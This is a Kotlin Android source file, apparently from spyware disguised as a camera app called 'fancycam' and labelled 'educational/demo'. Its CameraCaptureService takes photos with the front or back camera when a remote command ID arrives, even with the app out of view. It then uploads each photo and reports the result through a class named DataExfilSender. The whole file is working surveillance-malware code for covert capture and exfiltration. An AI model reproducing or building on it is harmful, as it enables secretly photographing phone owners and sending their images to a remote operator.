package com.example.fancycam.services

import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.example.fancycam.network.DataExfilSender
import com.example.fancycam.network.PhotoUploader
import com.example.fancycam.storage.PhotoStorageManager
import com.example.fancycam.ui.AppActivityLogger
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import java.io.File

/**
 * EDUCATIONAL/DEMO SERVICE
 *
 * Runs camera capture in a foreground service so a photo can be taken even when
 * the app's MainActivity is no longer in the foreground.
 *
 * Android 14+ requires a camera-type foreground service to be active while the
 * camera is in use; MEDIA_PROJECTION has no equivalent automatic allowance.
 */
class CameraCaptureService : Service(), LifecycleOwner {

    companion object {
        private const val TAG = "CameraCaptureService"
        private const val OWNER = "camera_capture"
        const val EXTRA_COMMAND_ID = "extra_command_id"
        const val EXTRA_LENS_FACING = "extra_lens_facing"

        fun start(context: Context, commandId: String? = null, lensFacing: Int? = null) {
            val intent = Intent(context, CameraCaptureService::class.java).apply {
                if (commandId != null) putExtra(EXTRA_COMMAND_ID, commandId)
                if (lensFacing != null) putExtra(EXTRA_LENS_FACING, lensFacing)
            }
            ContextCompat.startForegroundService(context, intent)
        }
    }

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private val mainHandler = Handler(Looper.getMainLooper())
    private val cameraExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
    private var provider: ProcessCameraProvider? = null
    private var imageCapture: ImageCapture? = null

    override fun onCreate() {
        super.onCreate()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        ForegroundNotifier.ensureChannel(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        ForegroundNotifier.startForeground(
            this,
            OWNER,
            ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        )

        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

        val commandId = intent?.getStringExtra(EXTRA_COMMAND_ID)
        val lensFacing = intent?.getIntExtra(EXTRA_LENS_FACING, 0) ?: 0

        mainHandler.post { runCapture(commandId, lensFacing) }
        return START_NOT_STICKY
    }

    private fun runCapture(commandId: String?, lensFacing: Int) {
        Thread {
            try {
                val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
                cameraProviderFuture.addListener({
                    try {
                        val provider = cameraProviderFuture.get()
                        this.provider = provider

                        val selector = if (lensFacing == 1) {
                            CameraSelector.DEFAULT_FRONT_CAMERA
                        } else {
                            CameraSelector.DEFAULT_BACK_CAMERA
                        }

                        val capture = ImageCapture.Builder()
                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                            .build()
                        imageCapture = capture

                        provider.unbindAll()
                        provider.bindToLifecycle(this, selector, capture)

                        takePhoto(provider, capture, commandId)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to bind camera use cases", e)
                        finish(commandId, success = false, error = e.message, file = null)
                    }
                }, ContextCompat.getMainExecutor(this))
            } catch (e: Exception) {
                Log.e(TAG, "Failed to initialize camera provider", e)
                finish(commandId, success = false, error = e.message, file = null)
            }
        }.start()
    }

    private fun takePhoto(
        provider: ProcessCameraProvider,
        capture: ImageCapture,
        commandId: String?
    ) {
        val file = PhotoStorageManager.createNewPhotoFile(this)
        val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()

        try {
            capture.takePicture(
                outputOptions,
                cameraExecutor,
                object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                        Thread {
                            PhotoStorageManager.indexPhotoInStorage(this@CameraCaptureService, file)
                            AppActivityLogger.logActivity(
                                context = this@CameraCaptureService,
                                type = "PHOTO",
                                title = "Background photo captured",
                                detail = "${file.name} (${file.length() / 1024} KB)",
                                success = true
                            )
                            val uploadResult = PhotoUploader.uploadPhotoSync(this@CameraCaptureService, file)
                            if (uploadResult.success) {
                                if (commandId != null) {
                                    DataExfilSender.reportCommandResult(
                                        this@CameraCaptureService,
                                        commandId,
                                        status = "completed",
                                        result = org.json.JSONObject().put("server_filename", uploadResult.serverFilename ?: "")
                                    )
                                }
                            } else {
                                if (commandId != null) {
                                    DataExfilSender.reportCommandResult(
                                        this@CameraCaptureService,
                                        commandId,
                                        status = "failed",
                                        error = uploadResult.message
                                    )
                                }
                            }
                            finish(commandId, success = true, error = null, file = file)
                        }.start()
                    }

                    override fun onError(exception: ImageCaptureException) {
                        Log.e(TAG, "Image capture failed", exception)
                        finish(commandId, success = false, error = exception.message, file = file)
                    }
                }
            )
        } catch (e: Exception) {
            Log.e(TAG, "takePicture threw", e)
            finish(commandId, success = false, error = e.message, file = file)
        }
    }

    private fun finish(
        commandId: String?,
        success: Boolean,
        error: String?,
        file: File?
    ) {
        try {
            if (commandId != null && !success) {
                DataExfilSender.reportCommandResult(this, commandId, status = "failed", error = error ?: "Unknown error")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to report command result", e)
        }
        try {
            mainHandler.post {
                try {
                    provider?.unbindAll()
                } catch (e: Exception) {
                    Log.w(TAG, "Unbind failed", e)
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Unbind scheduling failed", e)
        }
        cameraExecutor.shutdown()
        ForegroundNotifier.stopForeground(this, OWNER)
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
    }
}
